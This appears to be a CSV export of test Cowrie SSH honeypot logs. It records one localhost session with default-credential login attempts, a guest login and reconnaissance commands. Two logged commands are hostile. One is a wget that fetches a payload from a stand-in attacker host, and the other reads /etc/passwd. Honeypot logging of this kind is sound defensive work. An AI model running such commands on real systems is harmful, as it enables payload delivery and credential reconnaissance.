eventid,message,sensor,uuid,timestamp,src_ip,src_port,dst_ip,dst_port,session,protocol,_source_file,version,username,password,input,ttylog,size,shasum,duplicate,duration,url,outfile,fingerprint,filename,destfile,command,is_command_input,is_command_failed,is_login_success,is_login_failed,is_session_closed,is_log_closed,is_file_download,is_file_upload
cowrie.session.connect,New connection: 127.0.0.1:54321 (127.0.0.1:2222),PC4Me,877d950d-1649-11f1-8bf4-00155d923fee,2026-03-04 11:37:40.100000+00:00,127.0.0.1,54321.0,127.0.0.1,2222.0,bf1d67850980,ssh,cowrieTEST.json,,,,,,,,,,,,,,,,0,0,0,0,0,0,0,0
cowrie.client.version,Remote SSH version: SSH-2.0-OpenSSH_8.2p1 Ubuntu-4ubuntu0.5,PC4Me,877d950d-1649-11f1-8bf4-00155d923fee,2026-03-04 11:37:41+00:00,127.0.0.1,,127.0.0.1,2222.0,bf1d67850980,ssh,cowrieTEST.json,SSH-2.0-OpenSSH_8.2p1 Ubuntu-4ubuntu0.5,,,,,,,,,,,,,,,0,0,0,0,0,0,0,0
cowrie.login.failed,login attempt [root/root] failed,PC4Me,877d950d-1649-11f1-8bf4-00155d923fee,2026-03-04 11:37:44.500000+00:00,127.0.0.1,,127.0.0.1,2222.0,bf1d67850980,ssh,cowrieTEST.json,,root,root,,,,,,,,,,,,,0,0,0,1,0,0,0,0
cowrie.login.failed,login attempt [admin/admin123] failed,PC4Me,877d950d-1649-11f1-8bf4-00155d923fee,2026-03-04 11:37:47.900000+00:00,127.0.0.1,,127.0.0.1,2222.0,bf1d67850980,ssh,cowrieTEST.json,,admin,admin123,,,,,,,,,,,,,0,0,0,1,0,0,0,0
cowrie.login.success,login attempt [guest/guest] succeeded,PC4Me,877d950d-1649-11f1-8bf4-00155d923fee,2026-03-04 11:37:52.100000+00:00,127.0.0.1,,127.0.0.1,2222.0,bf1d67850980,ssh,cowrieTEST.json,,guest,guest,,,,,,,,,,,,,0,0,1,0,0,0,0,0
cowrie.command.input,CMD: mkdir dontfind,PC4Me,877d950d-1649-11f1-8bf4-00155d923fee,2026-03-04 11:37:55.913205+00:00,127.0.0.1,,,,bf1d67850980,ssh,cowrieTEST.json,,,,mkdir dontfind,,,,,,,,,,,mkdir dontfind,1,0,0,0,0,0,0,0
cowrie.command.input,CMD: ls,PC4Me,877d950d-1649-11f1-8bf4-00155d923fee,2026-03-04 11:37:56.716439+00:00,127.0.0.1,,,,bf1d67850980,ssh,cowrieTEST.json,,,,ls,,,,,,,,,,,ls,1,0,0,0,0,0,0,0
cowrie.command.input,CMD: cd dontfind,PC4Me,877d950d-1649-11f1-8bf4-00155d923fee,2026-03-04 11:37:59.200212+00:00,127.0.0.1,,,,bf1d67850980,ssh,cowrieTEST.json,,,,cd dontfind,,,,,,,,,,,cd dontfind,1,0,0,0,0,0,0,0
cowrie.command.input,CMD: pip install python,PC4Me,877d950d-1649-11f1-8bf4-00155d923fee,2026-03-04 11:38:05.210435+00:00,127.0.0.1,,,,bf1d67850980,ssh,cowrieTEST.json,,,,pip install python,,,,,,,,,,,pip install python,1,0,0,0,0,0,0,0
cowrie.command.failed,Command not found: pip install python,PC4Me,877d950d-1649-11f1-8bf4-00155d923fee,2026-03-04 11:38:05.211463+00:00,127.0.0.1,,,,bf1d67850980,ssh,cowrieTEST.json,,,,pip install python,,,,,,,,,,,pip install python,0,1,0,0,0,0,0,0
cowrie.command.input,CMD: uname -a,PC4Me,877d950d-1649-11f1-8bf4-00155d923fee,2026-03-04 11:38:06.500000+00:00,127.0.0.1,,,,bf1d67850980,ssh,cowrieTEST.json,,,,uname -a,,,,,,,,,,,uname -a,1,0,0,0,0,0,0,0
cowrie.command.input,CMD: whoami,PC4Me,877d950d-1649-11f1-8bf4-00155d923fee,2026-03-04 11:38:07+00:00,127.0.0.1,,,,bf1d67850980,ssh,cowrieTEST.json,,,,whoami,,,,,,,,,,,whoami,1,0,0,0,0,0,0,0
cowrie.command.input,CMD: wget http://malicious.example/payload.sh,PC4Me,877d950d-1649-11f1-8bf4-00155d923fee,2026-03-04 11:38:08.100000+00:00,127.0.0.1,,,,bf1d67850980,ssh,cowrieTEST.json,,,,wget http://malicious.example/payload.sh,,,,,,,,,,,wget http://malicious.example/payload.sh,1,0,0,0,0,0,0,0
cowrie.command.input,CMD: --help ,PC4Me,877d950d-1649-11f1-8bf4-00155d923fee,2026-03-04 11:38:09.776946+00:00,127.0.0.1,,,,bf1d67850980,ssh,cowrieTEST.json,,,,--help ,,,,,,,,,,,--help ,1,0,0,0,0,0,0,0
cowrie.command.failed,Command not found: --help ,PC4Me,877d950d-1649-11f1-8bf4-00155d923fee,2026-03-04 11:38:09.777567+00:00,127.0.0.1,,,,bf1d67850980,ssh,cowrieTEST.json,,,,--help ,,,,,,,,,,,--help ,0,1,0,0,0,0,0,0
cowrie.command.input,CMD: cat /etc/passwd,PC4Me,877d950d-1649-11f1-8bf4-00155d923fee,2026-03-04 11:38:10.300000+00:00,127.0.0.1,,,,bf1d67850980,ssh,cowrieTEST.json,,,,cat /etc/passwd,,,,,,,,,,,cat /etc/passwd,1,0,0,0,0,0,0,0
cowrie.command.input,CMD: exit,PC4Me,877d950d-1649-11f1-8bf4-00155d923fee,2026-03-04 11:38:12.143424+00:00,127.0.0.1,,,,bf1d67850980,ssh,cowrieTEST.json,,,,exit,,,,,,,,,,,exit,1,0,0,0,0,0,0,0
